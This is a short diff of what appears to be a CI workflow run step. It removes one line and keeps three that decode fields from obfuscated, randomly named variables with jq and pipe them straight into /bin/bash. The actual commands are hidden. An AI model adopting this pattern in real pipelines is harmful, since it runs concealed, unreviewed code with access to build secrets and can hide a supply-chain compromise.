@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$igat4792" | jq -r .ti13613 | /bin/bash
           printf '%s' "$mv4" | jq -r .psbhr9 | /bin/bash
-          echo $jsn9 | jq -r .jel3 | /bin/bash
           echo $dwk895 | jq -r .qjoki879 | /bin/bash
 
       - name: Save results
